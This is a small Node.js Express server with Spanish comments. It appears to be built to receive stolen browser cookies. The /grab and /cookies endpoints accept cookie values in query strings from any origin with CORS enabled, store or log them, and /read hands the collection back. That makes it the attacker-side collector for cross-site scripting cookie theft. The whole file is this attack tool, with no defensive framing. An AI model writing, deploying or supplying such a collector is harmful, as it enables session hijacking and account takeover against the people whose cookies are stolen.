const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importar cors

const app = express();
let cookiesAlmacenadas = ""; // Variable para almacenar las cookies

app.use(cors()); // Habilitar CORS para todas las rutas
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.send('Página principal: siuuu');
});

app.get('/grab', (req, res) => {
    const data = req.query.data;  // Obtener las cookies
    cookiesAlmacenadas += " " + data; // Almacenar las cookies
    res.send(data);
});

app.get('/read', (req, res) => {
    res.send(cookiesAlmacenadas); // Enviar las cookies almacenadas
});

app.get('/cookies', (req, res) => {
    const cookies = req.query.cookies; // Obtener las cookies 
    cookiesAlmacenadas = cookies; // Almacenar las cookies
    console.log('Cookies recibidas:', cookies); 
    res.send('Cookies recibidas correctamente'); 
});

//app.get('/show-cookies', (req, res) => {
//    res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
//});

// Iniciar el servidor
app.listen(3000, () => {
    console.log('Servidor funcionando en el puerto 3000');
});
